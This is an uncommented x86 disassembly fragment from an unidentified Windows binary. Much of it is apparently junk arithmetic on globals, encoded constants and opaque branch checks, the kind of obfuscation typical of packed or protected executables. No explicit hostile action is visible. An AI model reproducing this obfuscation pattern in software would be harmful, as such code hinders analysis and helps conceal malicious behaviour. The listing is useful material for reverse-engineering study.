  41ebce:	mov    DWORD PTR ds:0x42289a,edi
  41ebd4:	mov    esi,DWORD PTR ds:0x4228ce
  41ebda:	mov    DWORD PTR ds:0x42298e,ebx
  41ebe0:	jmp    0x41ec4b
  41ebe5:	mov    DWORD PTR ds:0x422962,edi
  41ebeb:	mov    DWORD PTR ds:0x4228f2,ebx
  41ebf1:	jb     0x41ec20
  41ebf7:	push   0x3714
  41ebfc:	push   DWORD PTR [ebp-0x1c]
  41ebff:	push   DWORD PTR [ebp-0x28]
  41ec02:	push   0x3c2f
  41ec07:	call   DWORD PTR ds:0x42a2c0
  41ec0d:	movzx  edx,BYTE PTR ds:0x422976
  41ec14:	and    DWORD PTR ds:0x4228de,edx
  41ec1a:	and    DWORD PTR ds:0x4228d2,ecx
  41ec20:	mov    ecx,DWORD PTR ds:0x422aba
  41ec26:	mov    edx,DWORD PTR ds:0x422ac6
  41ec2c:	sub    edx,ecx
  41ec2e:	sub    ecx,DWORD PTR [ecx+edx*1]
  41ec31:	adc    DWORD PTR ds:0x4228ea,ebx
  41ec37:	xor    ecx,ecx
  41ec39:	xor    ecx,DWORD PTR ds:0x422962
  41ec3f:	adc    DWORD PTR ds:0x4228ba,ecx
  41ec45:	xor    ecx,DWORD PTR ds:0x42297a
  41ec4b:	mov    DWORD PTR [esp+0x3c],0x141c
  41ec53:	add    esi,0x66a7
  41ec59:	mov    eax,DWORD PTR [esp+0x38]
  41ec5d:	adc    DWORD PTR ds:0x4228d2,ecx
  41ec63:	mov    ecx,DWORD PTR [esp+0x3c]
  41ec67:	mov    edx,DWORD PTR [esp+0x10]
  41ec6b:	adc    esi,0x6098
  41ec71:	mov    esi,DWORD PTR [esp+0x14]
  41ec75:	neg    DWORD PTR ds:0x42292e
  41ec7b:	push   esi
  41ec7c:	sub    DWORD PTR ds:0x42296e,0x5044
  41ec86:	push   edx
  41ec87:	xor    ecx,0x4611
  41ec8d:	xor    eax,0x43f8
  41ec92:	push   ecx
  41ec93:	push   eax
  41ec94:	call   0x421b6b
  41ec99:	add    DWORD PTR ds:0x42297e,0x76c7
  41eca3:	add    eax,0x2c3
  41eca8:	mov    DWORD PTR [esp+0x48],eax
  41ecac:	adc    edx,0x3413
  41ecb2:	mov    DWORD PTR [esp+0x4c],edx
  41ecb6:	adc    ebx,ebx
  41ecb8:	mov    DWORD PTR [esp+0x48],0x53b7
  41ecc0:	mov    DWORD PTR [esp+0x4c],0x3d65
  41ecc8:	cmp    DWORD PTR ds:0x422922,0x0
  41eccf:	mov    ebx,DWORD PTR ds:0x4228ce
  41ecd5:	mov    esi,0x4014
  41ecda:	jmp    0x41ed4f
  41ecdf:	mov    DWORD PTR ds:0x42291a,ecx
  41ece5:	jle    0x41ed32
  41eceb:	push   0x1943
  41ecf0:	push   DWORD PTR [ebp-0xc]
  41ecf3:	push   DWORD PTR [ebp-0x14]
  41ecf6:	push   0x5e2e
  41ecfb:	push   0x7771
  41ed00:	push   0x1795
  41ed05:	push   DWORD PTR [ebp-0x24]
  41ed08:	push   0x7fcf
  41ed0d:	push   DWORD PTR [ebp-0x10]
  41ed10:	call   DWORD PTR ds:0x42a2c4
  41ed16:	and    DWORD PTR ds:0x4228f6,ebx
  41ed1c:	xor    ebx,esi
  41ed1e:	xor    ebx,ebx
  41ed20:	xor    ebx,DWORD PTR ds:0x42295a
  41ed26:	or     ebx,DWORD PTR ds:0x4228d2
  41ed2c:	mov    DWORD PTR ds:0x42295a,ebx
  41ed32:	xor    esi,0x902
  41ed38:	dec    DWORD PTR ds:0x4228ca
  41ed3e:	mov    ebx,DWORD PTR ds:0x4229fa
  41ed44:	mov    esi,DWORD PTR ds:0x422a42
  41ed4a:	sub    ebx,esi
  41ed4c:	add    ebx,DWORD PTR [ebx+esi*1]
  41ed4f:	mov    DWORD PTR [esp+0x48],0x3123
  41ed57:	adc    ebx,esi
  41ed59:	mov    DWORD PTR [esp+0x4c],0x4c23
  41ed61:	mov    DWORD PTR ds:0x4228b6,0x79fc
  41ed6b:	mov    ebx,0xba699573
  41ed70:	xor    DWORD PTR ds:0x4229be,edi
  41ed76:	mov    DWORD PTR [esp+0x20],ebx
  41ed7a:	xor    DWORD PTR ds:0x42295a,0x1cf0
  41ed84:	mov    esi,0x9c0a89d8
  41ed89:	sbb    DWORD PTR ds:0x422896,0x240d
  41ed93:	mov    DWORD PTR [esp+0x24],esi
  41ed97:	add    DWORD PTR ds:0x4228d2,0x7237
  41eda1:	mov    DWORD PTR [esp+0x70],0xba699577
  41eda9:	and    DWORD PTR ds:0x4228ba,0x422966
  41edb3:	mov    DWORD PTR [esp+0x74],esi
  41edb7:	call   0x41a715
  41edbc:	lea    eax,[esp+0x58]
  41edc0:	xor    edx,edx
  41edc2:	or     edx,DWORD PTR ds:0x422892
  41edc8:	sbb    DWORD PTR ds:0x4228de,edx
  41edce:	mov    DWORD PTR [esp+0x10],eax
  41edd2:	mov    edx,DWORD PTR ds:0x422a32
  41edd8:	mov    ecx,DWORD PTR ds:0x422a56
  41edde:	sub    edx,ecx
  41ede0:	and    edx,DWORD PTR [edx+ecx*1]
  41ede3:	lea    eax,[esp+0x68]
  41ede7:	cmp    DWORD PTR ds:0x42292a,0x0
  41edee:	mov    DWORD PTR ds:0x422992,0x1c86
  41edf8:	mov    ecx,0x3791
  41edfd:	jmp    0x41ee5f
  41ee02:	mov    ecx,0x61d6
  41ee07:	mov    ecx,0xdc4
  41ee0c:	jge    0x41ee43
  41ee12:	push   DWORD PTR [ebp-0x28]
  41ee15:	call   DWORD PTR ds:0x42a2c8
  41ee1b:	and    DWORD PTR ds:0x4228fe,0x4228ea
  41ee25:	sbb    DWORD PTR ds:0x4228a6,edx
  41ee2b:	mov    ecx,DWORD PTR ds:0x4228de
  41ee31:	adc    ecx,DWORD PTR ds:0x4229aa
  41ee37:	mov    DWORD PTR ds:0x4228de,ecx
  41ee3d:	inc    DWORD PTR ds:0x4228b2
  41ee43:	adc    edx,0x372b
  41ee49:	and    DWORD PTR ds:0x4229be,edx
  41ee4f:	adc    DWORD PTR ds:0x4229ae,0x769d
  41ee59:	xor    DWORD PTR ds:0x422952,edx
  41ee5f:	mov    DWORD PTR [esp+0x18],eax
  41ee63:	mov    eax,ds:0x422268
  41ee68:	and    DWORD PTR ds:0x422962,ecx
  41ee6e:	mov    eax,DWORD PTR [eax+0x1d8]
  41ee74:	mov    eax,DWORD PTR [eax]
  41ee76:	sub    DWORD PTR ds:0x42293a,edx
  41ee7c:	mov    ecx,eax
  41ee7e:	cmp    DWORD PTR ds:0x422932,0x0
  41ee85:	mov    DWORD PTR ds:0x4229c2,0xfd6
  41ee8f:	mov    DWORD PTR ds:0x4229a6,edx
  41ee95:	jmp    0x41eedb
  41ee9a:	mov    DWORD PTR ds:0x422992,0x2118
  41eea4:	jae    0x41eec5
  41eeaa:	push   0x4228a6
  41eeaf:	push   0x66c0
  41eeb4:	call   DWORD PTR ds:0x42a084
  41eeba:	inc    edx
  41eebb:	sbb    DWORD PTR ds:0x4228d2,0x6891
  41eec5:	xor    edx,0x2613
  41eecb:	sbb    edx,0x7527
  41eed1:	mov    DWORD PTR ds:0x4229d2,0x388f
  41eedb:	xor    ecx,0xa3e69a9f
  41eee1:	xor    eax,0x1
  41eee4:	shl    eax,0x1e
  41eee7:	mov    DWORD PTR ds:0x4229b6,0x7a6d
  41eef1:	shr    ecx,0x2
  41eef4:	xor    edx,edx
  41eef6:	xor    edx,DWORD PTR ds:0x42289a
  41eefc:	or     DWORD PTR ds:0x4229d2,edx
  41ef02:	or     ecx,eax
  41ef04:	mov    eax,DWORD PTR [esp+0x18]
  41ef08:	mov    edx,DWORD PTR ds:0x4228ce
  41ef0e:	sbb    DWORD PTR ds:0x4228a6,edx
  41ef14:	mov    DWORD PTR [eax],ecx
  41ef16:	cmp    DWORD PTR ds:0x4229a6,0x0
  41ef1d:	mov    DWORD PTR ds:0x4229b6,0x1832
  41ef27:	mov    DWORD PTR ds:0x42296a,0x16b9
  41ef31:	jmp    0x41ef97
  41ef36:	mov    DWORD PTR ds:0x42290a,0x4517
  41ef40:	mov    eax,ds:0x4229ca
  41ef45:	jbe    0x41ef73
  41ef4b:	push   DWORD PTR [ebp-0x10]
  41ef4e:	push   DWORD PTR [ebp-0x28]
  41ef51:	push   0x51cb
  41ef56:	push   DWORD PTR [ebp-0x10]
  41ef59:	call   DWORD PTR ds:0x42a2cc
  41ef5f:	sbb    ecx,0x7972
  41ef65:	mov    edx,DWORD PTR ds:0x422952
  41ef6b:	xor    DWORD PTR ds:0x4229a2,edx
  41ef71:	add    edx,edx
  41ef73:	mov    edx,DWORD PTR ds:0x4229e2
  41ef79:	mov    edx,DWORD PTR [edx]
  41ef7b:	adc    DWORD PTR ds:0x42296e,edx
  41ef81:	sub    DWORD PTR ds:0x422992,0x5992
  41ef8b:	sbb    DWORD PTR ds:0x42294e,edi
  41ef91:	neg    DWORD PTR ds:0x4228c2
  41ef97:	lea    edi,[ebx-0x10]
  41ef9a:	add    DWORD PTR ds:0x4229a6,0x146e
  41efa4:	mov    DWORD PTR [esp+0x80],edi
  41efab:	or     DWORD PTR ds:0x42297e,ecx
  41efb1:	mov    DWORD PTR [esp+0x84],esi
  41efb8:	mov    eax,DWORD PTR [esp+0x80]
  41efbf:	mov    ecx,DWORD PTR [esp+0x84]
  41efc6:	sub    edx,DWORD PTR ds:0x42289a
  41efcc:	shrd   eax,ecx,0x2
  41efd0:	shr    ecx,0x2
  41efd3:	mov    ecx,DWORD PTR [esp+0x80]
  41efda:	adc    edx,DWORD PTR ds:0x4228d2
  41efe0:	mov    edx,DWORD PTR [esp+0x84]
  41efe7:	adc    DWORD PTR ds:0x4228ea,0x422972
  41eff1:	xor    eax,0x2e9a655c
  41eff6:	xor    edx,edx
  41eff8:	or     DWORD PTR ds:0x42297e,0x4228ea
  41f002:	or     edx,eax
  41f004:	mov    eax,ds:0x422268
  41f009:	or     DWORD PTR ds:0x4229b2,0x2c69
  41f013:	push   edx
  41f014:	push   DWORD PTR [eax+0x19c]
  41f01a:	or     DWORD PTR ds:0x422922,0x4228d6
  41f024:	lea    eax,[esp+0x84]
  41f02b:	add    DWORD PTR ds:0x4228ca,0x6620
  41f035:	push   eax
  41f036:	shl    ecx,0x1e
  41f039:	call   0x41d37f
  41f03e:	lea    eax,[ebp+0x10]
  41f041:	xor    DWORD PTR ds:0x422946,0x45ca
  41f04b:	push   eax
  41f04c:	and    DWORD PTR ds:0x42292a,0x42289a
  41f056:	mov    DWORD PTR [esp+0x4c],edi
  41f05a:	sbb    DWORD PTR ds:0x4228ea,0x4647
  41f064:	mov    DWORD PTR [esp+0x50],esi
  41f068:	lea    eax,[ebp+0xc]
  41f06b:	push   eax
  41f06c:	mov    DWORD PTR ds:0x4229a2,0x343e
  41f076:	mov    DWORD PTR [esp+0x50],edi
  41f07a:	lea    eax,[ebp+0x8]
  41f07d:	sbb    DWORD PTR ds:0x4229a6,0x424a
  41f087:	mov    DWORD PTR [esp+0x54],esi
  41f08b:	sub    DWORD PTR ds:0x4228de,0x42288e
  41f095:	mov    DWORD PTR [esp+0x50],edi
  41f099:	add    DWORD PTR ds:0x42298a,0x42297a
  41f0a3:	mov    DWORD PTR [esp+0x54],esi
  41f0a7:	push   eax
  41f0a8:	not    DWORD PTR ds:0x422996
  41f0ae:	call   0x41c1e0
  41f0b3:	or     DWORD PTR ds:0x42299a,0x467c
  41f0bd:	push   0x4
  41f0bf:	adc    DWORD PTR ds:0x422896,0x42298a
  41f0c9:	push   0x4220ec
  41f0ce:	or     DWORD PTR ds:0x4229a2,0x42297a
  41f0d8:	push   DWORD PTR [esp+0x18]
  41f0dc:	adc    DWORD PTR ds:0x422902,0x4228b2
  41f0e6:	call   0x41d37f
  41f0eb:	mov    eax,DWORD PTR [esp+0x10]
  41f0ef:	adc    DWORD PTR ds:0x42293e,edi
  41f0f5:	mov    ecx,DWORD PTR [esp+0x10]
  41f0f9:	add    edx,DWORD PTR ds:0x422962
  41f0ff:	mov    eax,DWORD PTR [eax]
  41f101:	cmp    DWORD PTR ds:0x422996,0x0
  41f108:	mov    DWORD PTR ds:0x422976,0x7903
  41f112:	not    DWORD PTR ds:0x4228e2
  41f118:	jmp    0x41f14c
  41f11d:	mov    DWORD PTR ds:0x422942,edi
  41f123:	jle    0x41f140
  41f129:	push   DWORD PTR [ebp-0x10]
  41f12c:	call   DWORD PTR ds:0x42a088
  41f132:	neg    edi
  41f134:	sbb    edx,DWORD PTR ds:0x422936
  41f13a:	not    DWORD PTR ds:0x42299a
  41f140:	not    edi
  41f142:	adc    DWORD PTR ds:0x42290e,0x107e
  41f14c:	mov    ecx,DWORD PTR [ecx]
  41f14e:	shr    eax,0x1e
  41f151:	shl    ecx,0x2
  41f154:	or     eax,ecx
  41f156:	mov    ecx,DWORD PTR [esp+0x10]
  41f15a:	xor    eax,0xa3e69a9d
  41f15f:	mov    DWORD PTR [ecx],eax
  41f161:	lea    eax,[esp+0x54]
  41f165:	mov    DWORD PTR [esp+0x94],eax
  41f16c:	lea    eax,[esp+0x94]
  41f173:	mov    DWORD PTR [esp+0x90],eax
  41f17a:	mov    eax,DWORD PTR [esp+0x54]
  41f17e:	sub    DWORD PTR [esp+0x54],eax
  41f182:	lea    eax,[ebp+0x4]
  41f185:	xor    DWORD PTR [esp+0x54],eax
  41f189:	mov    DWORD PTR [esp+0x10],0x5b3d
  41f191:	mov    DWORD PTR [esp+0x14],0x4445
  41f199:	mov    DWORD PTR [esp+0x38],0xa52
  41f1a1:	mov    DWORD PTR [esp+0x3c],0x1c69
  41f1a9:	mov    eax,DWORD PTR [esp+0x38]
  41f1ad:	mov    ecx,DWORD PTR [esp+0x3c]
  41f1b1:	mov    edx,DWORD PTR [esp+0x10]
  41f1b5:	mov    edi,DWORD PTR [esp+0x14]
  41f1b9:	add    eax,0xffffd1a5
  41f1be:	adc    ecx,0xffffedf0
  41f1c4:	xor    eax,edx
  41f1c6:	xor    ecx,edi
  41f1c8:	and    eax,0x325d
  41f1cd:	mov    DWORD PTR [esp+0x40],eax
  41f1d1:	and    ecx,0x3544
  41f1d7:	mov    DWORD PTR [esp+0x44],ecx
  41f1db:	mov    DWORD PTR [esp+0x18],0x1704
  41f1e3:	mov    DWORD PTR [esp+0x1c],0x4a75
  41f1eb:	mov    DWORD PTR [esp+0x10],0x985
  41f1f3:	mov    DWORD PTR [esp+0x14],0x341
  41f1fb:	mov    DWORD PTR [esp+0x38],0x5aa9
  41f203:	mov    DWORD PTR [esp+0x3c],0x221a
  41f20b:	mov    eax,DWORD PTR [esp+0x38]
  41f20f:	mov    ecx,DWORD PTR [esp+0x3c]
  41f213:	mov    edx,DWORD PTR [esp+0x10]
  41f217:	mov    edi,DWORD PTR [esp+0x14]
  41f21b:	push   edi
  41f21c:	push   edx
  41f21d:	or     ecx,0xc32
  41f223:	or     eax,0x502a
  41f228:	push   ecx
  41f229:	push   eax
  41f22a:	call   0x41e026
  41f22f:	mov    ecx,DWORD PTR [esp+0x18]
  41f233:	mov    edi,DWORD PTR [esp+0x1c]
  41f237:	sub    eax,ecx
  41f239:	mov    ecx,DWORD PTR [esp+0x40]
  41f23d:	sbb    edx,edi
  41f23f:	mov    edi,DWORD PTR [esp+0x44]
  41f243:	cmp    ecx,eax
  41f245:	jne    0x41f253
  41f24b:	cmp    edi,edx
  41f24d:	je     0x41f712
  41f253:	mov    DWORD PTR [esp+0x10],0x71ba
  41f25b:	mov    DWORD PTR [esp+0x14],0x5f78
  41f263:	mov    DWORD PTR [esp+0x38],0x7b9c
  41f26b:	mov    DWORD PTR [esp+0x3c],0x5622
  41f273:	mov    eax,DWORD PTR [esp+0x38]
  41f277:	mov    ecx,DWORD PTR [esp+0x3c]
  41f27b:	mov    edx,DWORD PTR [esp+0x10]
  41f27f:	mov    edi,DWORD PTR [esp+0x14]
  41f283:	add    eax,0x3646
  41f288:	adc    ecx,0x7ace
  41f28e:	xor    eax,0x3e2e
  41f293:	xor    ecx,0x4b71
  41f299:	and    eax,edx
  41f29b:	mov    DWORD PTR [esp+0x48],eax
  41f29f:	and    ecx,edi
  41f2a1:	mov    DWORD PTR [esp+0x4c],ecx
  41f2a5:	mov    DWORD PTR [esp+0x40],0x18d6
  41f2ad:	mov    DWORD PTR [esp+0x44],0x2bb4
  41f2b5:	mov    DWORD PTR [esp+0x18],0x14
  41f2bd:	mov    DWORD PTR [esp+0x1c],0x0
  41f2c5:	mov    DWORD PTR [esp+0x10],0x1
  41f2cd:	mov    DWORD PTR [esp+0x14],0x0
  41f2d5:	mov    DWORD PTR [esp+0x38],0xa87
  41f2dd:	mov    DWORD PTR [esp+0x3c],0x7fd9
  41f2e5:	mov    eax,DWORD PTR [esp+0x38]
  41f2e9:	mov    ecx,DWORD PTR [esp+0x3c]
  41f2ed:	push   0x2
  41f2ef:	push   0x7f349462
  41f2f4:	xor    ecx,0x3601
  41f2fa:	xor    eax,0x5491
  41f2ff:	push   ecx
  41f300:	push   eax
  41f301:	call   0x421b6b
  41f306:	mov    ecx,DWORD PTR [esp+0x10]
  41f30a:	mov    edi,DWORD PTR [esp+0x14]
  41f30e:	push   edi
  41f30f:	push   ecx
  41f310:	push   edx
  41f311:	push   eax
  41f312:	call   0x421b6b
  41f317:	mov    ecx,DWORD PTR [esp+0x18]
  41f31b:	mov    edi,DWORD PTR [esp+0x1c]
  41f31f:	push   edi
  41f320:	push   ecx
  41f321:	push   edx
  41f322:	push   eax
  41f323:	call   0x421b6b
  41f328:	mov    ecx,DWORD PTR [esp+0x40]
  41f32c:	mov    edi,DWORD PTR [esp+0x44]
  41f330:	add    eax,ecx
  41f332:	mov    ecx,DWORD PTR [esp+0x48]
  41f336:	adc    edx,edi
  41f338:	mov    edi,DWORD PTR [esp+0x4c]
  41f33c:	cmp    ecx,eax
  41f33e:	jne    0x41f34c
  41f344:	cmp    edi,edx
  41f346:	je     0x41f712
  41f34c:	mov    eax,DWORD PTR [esp+0x54]
  41f350:	mov    edx,DWORD PTR [esp+0x20]
  41f354:	mov    edi,DWORD PTR [esp+0x24]
  41f358:	xor    ecx,ecx
  41f35a:	shld   ecx,eax,0x2
  41f35e:	shl    eax,0x2
  41f361:	xor    eax,ebx
  41f363:	xor    ecx,esi
  41f365:	cmp    eax,edx
  41f367:	jne    0x41f375
  41f36d:	cmp    ecx,edi
  41f36f:	je     0x41f712
  41f375:	mov    eax,DWORD PTR [esp+0x58]
  41f379:	cmp    eax,0xa3e69a99
  41f37e:	je     0x41f3d5
  41f384:	mov    eax,DWORD PTR [esp+0x20]
  41f388:	mov    ecx,DWORD PTR [esp+0x24]
  41f38c:	mov    edx,DWORD PTR [esp+0x20]
  41f390:	mov    edi,DWORD PTR [esp+0x24]
  41f394:	xor    edi,esi
  41f396:	xor    edx,ebx
  41f398:	shrd   edx,edi,0x2
  41f39c:	mov    ecx,eax
  41f39e:	shr    edi,0x2
  41f3a1:	xor    eax,eax
  41f3a3:	mov    DWORD PTR [esp+0x10],edi
  41f3a7:	mov    edi,edx
  41f3a9:	or     edi,eax
  41f3ab:	mov    eax,DWORD PTR [esp+0x10]
  41f3af:	shl    ecx,0x1e
  41f3b2:	xor    ecx,0xc0000000
  41f3b8:	or     eax,ecx
  41f3ba:	mov    DWORD PTR [esp+0x4c],eax
  41f3be:	mov    eax,DWORD PTR [esp+0x68]
  41f3c2:	cdq    
  41f3c3:	cmp    edi,eax
  41f3c5:	jne    0x41f712
  41f3cb:	cmp    DWORD PTR [esp+0x4c],edx
  41f3cf:	jne    0x41f712
  41f3d5:	mov    DWORD PTR [esp+0x64],0x422304
  41f3dd:	mov    DWORD PTR [esp+0x6c],0x4222fc
  41f3e5:	mov    eax,DWORD PTR [esp+0x7c]
  41f3e9:	mov    eax,DWORD PTR [esp+0x7c]
  41f3ed:	mov    edx,DWORD PTR [esp+0x20]
  41f3f1:	mov    edi,DWORD PTR [esp+0x24]
  41f3f5:	xor    ecx,ecx
  41f3f7:	shld   ecx,eax,0x2
  41f3fb:	shl    eax,0x2
  41f3fe:	xor    eax,ebx
  41f400:	xor    ecx,esi
  41f402:	cmp    edx,eax
  41f404:	jne    0x41f622
  41f40a:	cmp    edi,ecx
  41f40c:	jne    0x41f622
  41f412:	mov    DWORD PTR [esp+0x10],0x42228c
  41f41a:	mov    ecx,DWORD PTR [esp+0x20]
  41f41e:	mov    eax,DWORD PTR [esp+0x24]
  41f422:	shrd   ecx,eax,0x2
  41f426:	shr    eax,0x2
  41f429:	mov    eax,DWORD PTR [esp+0x20]
  41f42d:	mov    edx,DWORD PTR [esp+0x24]
  41f431:	shl    eax,0x1e
  41f434:	mov    edi,0x2e9a655c
  41f439:	xor    ecx,edi
  41f43b:	xor    eax,eax
  41f43d:	or     eax,ecx
  41f43f:	mov    ecx,DWORD PTR [esp+0x10]
  41f443:	mov    ecx,DWORD PTR [ecx+0xc]
  41f446:	cmp    eax,DWORD PTR [ecx]
  41f448:	jne    0x41f5c1
  41f44e:	mov    eax,0x65c7
  41f453:	mov    WORD PTR [esp+0x40],ax
  41f458:	mov    eax,0x6062
  41f45d:	mov    WORD PTR [esp+0x18],ax
  41f462:	mov    eax,0x125d
  41f467:	mov    WORD PTR [esp+0x10],ax
  41f46c:	movzx  eax,WORD PTR [esp+0x10]
  41f471:	mov    ecx,0x2d0f
  41f476:	and    ax,cx
  41f479:	mov    cx,WORD PTR [esp+0x18]
  41f47e:	or     ax,cx
  41f481:	mov    cx,WORD PTR [esp+0x40]
  41f486:	add    ax,cx
  41f489:	or     eax,0x3b22
  41f48e:	mov    WORD PTR [esp+0x30],ax
  41f493:	mov    eax,0x57d4
  41f498:	mov    WORD PTR [esp+0x40],ax
  41f49d:	mov    eax,0x3b21
  41f4a2:	mov    WORD PTR [esp+0x2c],ax
  41f4a7:	mov    eax,0x52fd
  41f4ac:	mov    WORD PTR [esp+0x18],ax
  41f4b1:	mov    eax,0x2ce0
  41f4b6:	mov    WORD PTR [esp+0x10],ax
  41f4bb:	mov    ax,WORD PTR [esp+0x10]
  41f4c0:	mov    cx,WORD PTR [esp+0x18]
  41f4c5:	or     ax,cx
  41f4c8:	mov    ecx,0x21a4
  41f4cd:	or     ax,cx
  41f4d0:	mov    cx,WORD PTR [esp+0x40]
  41f4d5:	sub    ax,cx
  41f4d8:	mov    cx,WORD PTR [esp+0x2c]
  41f4dd:	sub    ax,cx
  41f4e0:	mov    cx,WORD PTR [esp+0x30]
  41f4e5:	cmp    cx,ax
  41f4e8:	jbe    0x41f5c1
  41f4ee:	mov    eax,0x5008
  41f4f3:	mov    WORD PTR [esp+0x18],ax
  41f4f8:	mov    eax,0x60ce
  41f4fd:	mov    WORD PTR [esp+0x10],ax
  41f502:	movzx  eax,WORD PTR [esp+0x10]
  41f507:	mov    ecx,0x2095
  41f50c:	or     ax,cx
  41f50f:	mov    cx,WORD PTR [esp+0x18]
  41f514:	sub    ax,cx
  41f517:	mov    ecx,0x10de
  41f51c:	or     eax,0x742f
  41f521:	imul   eax,eax,0x30b2
  41f527:	mov    WORD PTR [esp+0x30],ax
  41f52c:	mov    eax,0x6143
  41f531:	mov    WORD PTR [esp+0x2c],ax
  41f536:	mov    eax,0x679f
  41f53b:	mov    WORD PTR [esp+0x40],ax
  41f540:	mov    eax,0x1210
  41f545:	mov    WORD PTR [esp+0x18],ax
  41f54a:	mov    eax,0x3308
  41f54f:	mov    WORD PTR [esp+0x10],ax
  41f554:	mov    ax,WORD PTR [esp+0x10]
  41f559:	sub    ax,cx
  41f55c:	mov    cx,WORD PTR [esp+0x18]
  41f561:	xor    ax,cx
  41f564:	mov    cx,WORD PTR [esp+0x40]
  41f569:	imul   ax,cx
  41f56d:	mov    cx,WORD PTR [esp+0x2c]
  41f572:	and    ax,cx
  41f575:	mov    ecx,0x694c
  41f57a:	and    ax,cx
  41f57d:	mov    cx,WORD PTR [esp+0x30]
  41f582:	cmp    cx,ax
  41f585:	ja     0x41f5c1
  41f58b:	mov    eax,DWORD PTR [esp+0x20]
  41f58f:	mov    ecx,DWORD PTR [esp+0x24]
  41f593:	shrd   eax,ecx,0x2
  41f597:	shr    ecx,0x2
  41f59a:	mov    ecx,DWORD PTR [esp+0x20]
  41f59e:	mov    edx,DWORD PTR [esp+0x24]
  41f5a2:	xor    eax,edi
  41f5a4:	xor    edx,edx
  41f5a6:	or     edx,eax
  41f5a8:	push   edx
  41f5a9:	push   esi
  41f5aa:	push   0xba699563
  41f5af:	lea    eax,[esp+0x7c]
  41f5b3:	push   eax
  41f5b4:	lea    eax,[esp+0x30]
  41f5b8:	push   eax
  41f5b9:	shl    ecx,0x1e
  41f5bc:	call   0x41d307
  41f5c1:	push   DWORD PTR [esp+0x74]
  41f5c5:	push   DWORD PTR [esp+0x74]
  41f5c9:	push   DWORD PTR [esp+0x2c]
  41f5cd:	push   DWORD PTR [esp+0x2c]
  41f5d1:	call   0x41d4db
  41f5d6:	mov    ecx,DWORD PTR [esp+0x20]
  41f5da:	mov    eax,DWORD PTR [esp+0x24]
  41f5de:	shrd   ecx,eax,0x2
  41f5e2:	shr    eax,0x2
  41f5e5:	mov    eax,DWORD PTR [esp+0x20]
  41f5e9:	mov    edx,DWORD PTR [esp+0x24]
  41f5ed:	shl    eax,0x1e
  41f5f0:	xor    eax,eax
  41f5f2:	xor    ecx,edi
  41f5f4:	or     eax,ecx
  41f5f6:	mov    ecx,DWORD PTR [esp+0x64]
  41f5fa:	mov    DWORD PTR [ecx],eax
  41f5fc:	mov    ecx,DWORD PTR [esp+0x20]
  41f600:	mov    eax,DWORD PTR [esp+0x24]
  41f604:	shrd   ecx,eax,0x2
  41f608:	shr    eax,0x2
  41f60b:	mov    eax,DWORD PTR [esp+0x20]
  41f60f:	mov    edx,DWORD PTR [esp+0x24]
  41f613:	shl    eax,0x1e
  41f616:	xor    ecx,edi
  41f618:	xor    eax,eax
  41f61a:	or     eax,ecx
  41f61c:	mov    ecx,DWORD PTR [esp+0x6c]
  41f620:	mov    DWORD PTR [ecx],eax
  41f622:	mov    eax,DWORD PTR [esp+0x6c]
  41f626:	mov    ecx,DWORD PTR [esp+0x6c]
  41f62a:	mov    eax,DWORD PTR [eax]
  41f62c:	cmp    eax,DWORD PTR [ecx]
  41f62e:	jne    0x41f6f6
  41f634:	mov    eax,DWORD PTR [esp+0x64]
  41f638:	mov    ecx,DWORD PTR [esp+0x64]
  41f63c:	mov    eax,DWORD PTR [eax]
  41f63e:	cmp    eax,DWORD PTR [ecx]
  41f640:	jne    0x41f6f6
  41f646:	mov    BYTE PTR [esp+0x40],0x20
  41f64b:	mov    BYTE PTR [esp+0x2c],0x3
  41f650:	mov    BYTE PTR [esp+0x30],0x6d
  41f655:	mov    BYTE PTR [esp+0x37],0x90
  41f65a:	mov    al,BYTE PTR [esp+0x37]
  41f65e:	mov    cl,BYTE PTR [esp+0x30]
  41f662:	or     al,0xdc
  41f664:	sub    al,cl
  41f666:	mov    cl,BYTE PTR [esp+0x2c]
  41f66a:	sub    al,0x56
  41f66c:	movzx  eax,al
  41f66f:	movzx  ecx,cl
  41f672:	cdq    
  41f673:	idiv   ecx
  41f675:	movzx  ecx,BYTE PTR [esp+0x40]
  41f67a:	or     eax,ecx
  41f67c:	mov    BYTE PTR [esp+0x10],al
  41f680:	mov    BYTE PTR [esp+0x18],0x1
  41f685:	mov    BYTE PTR [esp+0x37],0xcf
  41f68a:	mov    BYTE PTR [esp+0x30],0x6
  41f68f:	mov    BYTE PTR [esp+0x2c],0x25
  41f694:	mov    BYTE PTR [esp+0x40],0xf8
  41f699:	mov    al,BYTE PTR [esp+0x40]
  41f69d:	mov    cl,BYTE PTR [esp+0x2c]
  41f6a1:	or     al,0xc4
  41f6a3:	and    al,cl
  41f6a5:	mov    cl,BYTE PTR [esp+0x30]
  41f6a9:	imul   cl
  41f6ab:	mov    cl,BYTE PTR [esp+0x37]
  41f6af:	movzx  ecx,cl
  41f6b2:	movzx  eax,al
  41f6b5:	and    eax,ecx
  41f6b7:	mov    cl,BYTE PTR [esp+0x18]
  41f6bb:	movzx  ecx,cl
  41f6be:	cdq    
  41f6bf:	idiv   ecx
  41f6c1:	mov    cl,BYTE PTR [esp+0x10]
  41f6c5:	cmp    cl,al
  41f6c7:	je     0x41f712
  41f6cd:	lea    eax,[esp+0x90]
  41f6d4:	push   eax
  41f6d5:	lea    edi,[esp+0x90]
  41f6dc:	call   0x41c539
  41f6e1:	cmp    eax,ebx
  41f6e3:	jne    0x41f712
  41f6e9:	cmp    edx,esi
  41f6eb:	jne    0x41f712
  41f6f1:	jmp    0x41e278
  41f6f6:	mov    eax,DWORD PTR [esp+0x70]
  41f6fa:	mov    ecx,DWORD PTR [esp+0x74]
  41f6fe:	mov    edx,DWORD PTR [esp+0x20]
  41f702:	mov    edi,DWORD PTR [esp+0x24]
  41f706:	add    eax,edx
  41f708:	adc    ecx,edi
  41f70a:	mov    DWORD PTR [esp+0x20],eax
  41f70e:	mov    DWORD PTR [esp+0x24],ecx
  41f712:	push   0x4
  41f714:	push   0x422268
  41f719:	lea    eax,[esp+0x64]
  41f71d:	push   eax
  41f71e:	call   0x41d37f
  41f723:	mov    eax,DWORD PTR [esp+0x5c]
  41f727:	push   0x4
  41f729:	push   DWORD PTR [eax+0x1a4]
  41f72f:	lea    eax,[esp+0x68]
  41f733:	push   eax
  41f734:	call   0x41d37f
  41f739:	mov    eax,DWORD PTR [esp+0x5c]
  41f73d:	mov    eax,DWORD PTR [eax+0x1a4]
  41f743:	mov    eax,DWORD PTR [eax]
  41f745:	mov    ecx,DWORD PTR [esp+0x5c]
  41f749:	mov    eax,DWORD PTR [eax+0x3c]
  41f74c:	mov    ecx,DWORD PTR [ecx+0x1a4]
